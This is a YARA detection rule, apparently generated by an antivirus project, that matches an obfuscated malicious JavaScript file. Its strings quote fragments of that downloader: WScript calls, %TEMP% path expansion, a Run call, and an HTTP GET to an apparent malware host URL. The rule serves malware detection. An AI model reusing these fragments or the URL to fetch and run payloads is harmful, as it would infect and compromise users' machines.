rule sig_20160428_9752f42dcd0e620cdb37edd542d08960 {
  meta:
    description = "datamaliciousorder - file 20160428_9752f42dcd0e620cdb37edd542d08960.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3010aa2d0b3b4c4c279ce8ffee8145bf26236cb908f28c042cf0530a6ed2909d"

  strings:
    $s1  = "UgoYdiMgwPicSyzLmuKmy[EgxOifDgyAjpIarBotQsd](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "return WleYjeAotSreIffGetRjw - VqdNrsDgnIhkTudOtpQhy;};" fullword ascii
    $s3  = "function IglLstGgmEekMrkXtfScx(WleYjeAotSreIffGetRjw, VqdNrsDgnIhkTudOtpQhy){SyoDamDctZjlGgfTkbTdc = SyoDamDctZjlGgfTkbTdc * 1; " ascii
    $s4  = "function KeyCdfYbiLbnSskZwzLmq() {return XwyGhiOlzUsnHpsEbzHzw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "function RmmWpgDtiPvcRneJpjNii(TyhVnpJbiUssTihHmzXmg){XwyGhiOlzUsnHpsEbzHzw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "function IglLstGgmEekMrkXtfScx(WleYjeAotSreIffGetRjw, VqdNrsDgnIhkTudOtpQhy){SyoDamDctZjlGgfTkbTdc = SyoDamDctZjlGgfTkbTdc * 1; " ascii
    $s7  = "function RmmWpgDtiPvcRneJpjNii(TyhVnpJbiUssTihHmzXmg){XwyGhiOlzUsnHpsEbzHzw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "function KeyCdfYbiLbnSskZwzLmq() {return XwyGhiOlzUsnHpsEbzHzw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "}while (XljIrcGkiKipWsnQrbRzk);" fullword ascii
    $s10 = "function TbpFkrEsmBcpOfwKhwXac(){return BqyBvlKeuKawMcwFgcWxi + \"\";};" fullword ascii
    $s11 = "if (UgoYdiMgwPicSyzLmuKmy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "var XwyGhiOlzUsnHpsEbzHzw = function KzxVqjTonOpgPkwAhqBos() {return OcaFccZtlObwQvqXjlFpu[HxrQnyZnrPlbXfoHuaGzr](\"WScript\"+\"" ascii
    $s13 = "function NsfQqbXezJenAcoZfwOnf() {return ((UbwMhfAhqSgxVklAzbVny == true) && (UbwMhfAhqSgxVklAzbVny == LffDcgVrsLmfXkcOzkOlx)) ?" ascii
    $s14 = "function NsfQqbXezJenAcoZfwOnf() {return ((UbwMhfAhqSgxVklAzbVny == true) && (UbwMhfAhqSgxVklAzbVny == LffDcgVrsLmfXkcOzkOlx)) ?" ascii
    $s15 = "var OcaFccZtlObwQvqXjlFpu = this[\"WScript\"];" fullword ascii
    $s16 = "var XwyGhiOlzUsnHpsEbzHzw = function KzxVqjTonOpgPkwAhqBos() {return OcaFccZtlObwQvqXjlFpu[HxrQnyZnrPlbXfoHuaGzr](\"WScript\"+\"" ascii
    $s17 = "UbwMhfAhqSgxVklAzbVny = true; " fullword ascii
    $s18 = "var NgjZncIdrFsgWbxSliKzk = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "EwcUwlGmqMqyWmrGdjKxh = true;" fullword ascii
    $s20 = "function FekZunRxyWxiCeiAxkIda(){return HxrQnyZnrPlbXfoHuaGzr;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}